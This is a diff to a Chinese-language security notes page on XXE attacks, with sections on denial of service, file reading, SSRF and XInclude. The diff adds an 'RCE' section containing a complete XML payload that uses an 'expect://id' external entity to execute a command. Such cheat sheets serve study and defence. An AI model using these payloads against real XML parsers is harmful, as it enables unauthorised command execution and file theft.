@@ -16,7 +16,6 @@ XXE
 
 拒绝服务攻击
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 ::
 
     <!DOCTYPE data [
@@ -31,9 +30,8 @@ XXE
 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。
 
 
-一般XXE攻击
+文件读取
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 ::
 
     <?xml version="1.0"?>
@@ -45,7 +43,6 @@ XXE
 
 SSRF
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 ::
 
     <?xml version="1.0"?>
@@ -54,9 +51,21 @@ SSRF
     ]>
     <data>4</data>
 
+RCE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+::
+
+    <?xml version="1.0"?>
+    <!DOCTYPE GVI [ <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "expect://id" >]>
+    <catalog>
+       <core id="test101">
+          <description>&xxe;</description>
+       </core>
+    </catalog>
+
 XInclude
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 ::
 
     <?xml version='1.0'?>
@@ -65,7 +74,6 @@ XInclude
 
 参考链接
 --------------------------------------
-
 - `XML教程 <http://www.w3school.com.cn/xml/>`_
 - `未知攻焉知防 XXE漏洞攻防 <https://security.tencent.com/index.php/blog/msg/69>`_
 - `XXE 攻击笔记分享 <http://www.freebuf.com/articles/web/97833.html>`_
